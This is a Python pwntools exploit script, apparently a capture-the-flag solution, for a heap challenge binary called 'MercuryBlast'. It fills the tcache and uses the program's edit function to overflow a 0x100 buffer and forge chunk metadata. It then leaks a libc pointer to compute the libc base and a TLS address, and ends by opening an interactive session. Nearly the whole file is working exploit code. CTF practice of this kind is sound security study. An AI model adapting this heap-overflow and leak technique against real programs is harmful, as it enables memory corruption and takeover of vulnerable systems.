from pwn import * 

binary = "./MercuryBlast_patched"
p = process(binary)
s = '''
b * add_record
b * edit_record+384
b * delete_record
b * print_records
'''
# add_record+334 before read()
#b * print_records+223
context.log_level = 'debug'
libc = ELF('./libc.so.6')
elf = ELF(binary)
context.binary = binary


def add_record(size, data):
    p.sendlineafter("Your choice: ", "1")
    p.sendlineafter("Input Temperature:", "1")
    p.sendlineafter("Input Description Size: ", str(size))
    p.sendafter("Input Description: ", data)

def edit_record(index, size, buffer): # size <= 0x200
    p.sendlineafter("Your choice: ", "4")
    p.sendlineafter("Input index: ", str(index))
    p.sendlineafter("Input Temperature: ", "1")
    p.sendlineafter("Input Description Size: ", str(size))
    p.sendafter("Input Description: ", buffer)

def delete_record(idx):
    p.sendlineafter("Your choice: ", "3")
    p.sendlineafter("Input Index:", str(idx))

def print_record():
    p.sendlineafter("Your choice: ", "2")
    #print(p.clean().decode())



for i in range(8):
    add_record(0x100, b"a")
add_record(0x100, b"a")
for i in range(8):
    delete_record(i)
add_record(0x100, b"a")

 
payload = flat(
    b"A" * 0x100,
    0,
    0x21,
    0x1,
    0x1000
)
add_record(0x100, b"b")

edit_record(1, 0x200, payload)

gdb.attach(p, s)
print_record()

leak = p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')
leak = u64(leak)
print(hex(leak))

libc.address = leak - 0x219ce0
print(hex(libc.address)) # got it!

tls = libc.address - 0x28c0

print(hex(tls))
p.interactive()